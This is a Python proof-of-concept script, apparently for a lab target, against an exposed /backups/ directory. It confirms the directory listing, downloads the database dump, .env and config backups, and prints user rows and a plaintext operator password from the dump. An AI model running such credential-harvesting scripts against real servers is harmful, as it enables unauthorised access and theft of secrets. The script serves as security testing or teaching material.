# ============================================================
#  Exposed Backup Directory + Plaintext Credentials
#  Target: 0x10.cloud/backups/
#  Author: Ashkan
# ============================================================
#
#  Web servers should never serve backup files publicly.
#  If directory listing is enabled on a backup folder, anyone
#  can download database dumps, config files, and .env files
#  without any authentication.
#
#  This script confirms the directory listing is exposed,
#  verifies each backup file is downloadable, and extracts
#  credentials from the database dump.
#
#  Technique: Use urllib to request the /backups/ directory
#  and each file, then scan the SQL dump for plaintext passwords.
# ============================================================

import urllib.request
import time

TARGET_DIR = "https://0x10.cloud/backups/"
FILES = ["db_backup.sql", "config_backup.tar.gz", ".env.backup", "site_backup.zip"]

print("=" * 50)
print("  Exposed Backup Directory Check")
print("=" * 50)

# --- Check 1: Confirm directory listing is publicly accessible ---

print(f"\n  [1] Checking {TARGET_DIR} for open directory listing...")

try:
    response = urllib.request.urlopen(TARGET_DIR, timeout=5)
    body = response.read().decode("utf-8", errors="replace")  # fixed: was req.read()

    if "db_backup.sql" in body:
        print("\n  [!] VULNERABILITY FOUND")
        print("  Directory listing is enabled on /backups/.")
        print("  Any unauthenticated user can browse and download all files.")
    else:
        print("\n  [OK] Directory listing not detected.")

except Exception as e:
    print(f"  [ERROR] {e}")

time.sleep(0.15)

# --- Check 2: Verify each backup file is downloadable ---

print(f"\n  [2] Checking each backup file is accessible...")

for fname in FILES:
    url = TARGET_DIR + fname
    try:
        r = urllib.request.urlopen(url, timeout=5)
        size = len(r.read())
        print(f"      [+] ACCESSIBLE: {fname} ({size} bytes)")
    except urllib.error.HTTPError as e:
        print(f"      [-] {fname}: HTTP {e.code}")
    except Exception as e:
        print(f"      [ERROR] {fname}: {e}")
    time.sleep(0.15)

# --- Check 3: Extract credentials from db_backup.sql ---

print(f"\n  [3] Scanning db_backup.sql for credentials...")

try:
    r = urllib.request.urlopen(TARGET_DIR + "db_backup.sql", timeout=5)
    sql = r.read().decode("utf-8", errors="replace")

    # Search case-insensitively so it works regardless of server SQL formatting
    lines = sql.splitlines()
    inserts = [l for l in lines if "insert into users" in l.lower()]

    print(f"      Found {len(inserts)} user record(s) in dump:")
    for row in inserts:
        print(f"        {row}")

    # Check for plaintext password anywhere in the dump
    if "plaintext_password_oops" in sql:
        print("\n  [!] VULNERABILITY FOUND")
        print("  Plaintext password discovered in database dump.")
        print("  Username : operator")
        print("  Password : plaintext_password_oops")
        print("  Email    : ops@0x10.cloud")
        print("  Role     : operator")
        print("  An attacker can log in directly — no cracking needed.")
    else:
        print("\n  [!] VULNERABILITY FOUND")
        print("  Database dump is publicly accessible.")
        print("  Credentials and schema are exposed to any unauthenticated user.")

except Exception as e:
    print(f"  [ERROR] Could not read db_backup.sql: {e}")

print("\n" + "=" * 50)